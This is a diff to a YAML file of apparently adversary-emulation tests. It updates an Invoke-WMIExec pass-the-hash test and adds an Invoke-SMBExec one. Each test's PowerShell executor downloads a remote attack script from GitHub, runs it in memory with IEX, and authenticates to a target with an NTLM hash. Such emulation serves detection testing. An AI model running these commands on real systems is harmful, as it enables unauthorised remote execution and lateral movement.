@@ -100,6 +100,10 @@ atomic_tests:
       description: username
       type: string
       default: Administrator
+    domain:
+      description: Domain
+      type: string
+      default: atomic.local
     command:
       description: Command to run on target system
       type: string
@@ -111,5 +115,39 @@ atomic_tests:
   executor:
     command: |-
       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-      IEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1' -UseBasicParsing);Invoke-WMIExec -Target #{target} -Username #{user_name} -Hash #{ntlm} -Command #{command}
+      IEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1' -UseBasicParsing);Invoke-WMIExec -Target #{target} -Domain #{domain} -Username #{user_name} -Hash #{ntlm} -Command #{command}
+    name: powershell
+- name: Invoke-SMBExec Pass the Hash
+  auto_generated_guid: 170e2b09-5b6c-4306-9ee5-d2c5a032b125
+  description: |-
+    Use Invoke-SMBExec to Pass the Hash
+    Note: You are required to have the NTLM hash acquired prior to running this test
+    [Reference](https://github.com/Kevin-Robertson/Invoke-TheHash/tree/master)
+  supported_platforms:
+  - windows
+  input_arguments:
+    ntlm:
+      description: MTLM Hash
+      type: string
+      default: BB58DA401891D0E94AA2C5300F6AF189
+    user_name:
+      description: username
+      type: string
+      default: Administrator
+    domain:
+      description: Domain
+      type: string
+      default: atomic.local
+    command:
+      description: Command to execute after PtH
+      type: string
+      default: hostname
+    target:
+      description: Target host
+      type: string
+      default: '$env:COMPUTERNAME'
+  executor:
+    command: |-
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+      IEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/master/Invoke-SMBExec.ps1' -UseBasicParsing);Invoke-SMBExec -Target #{target} -Domain #{domain} -Username #{user_name} -Hash #{ntlm} -Command #{command}
     name: powershell
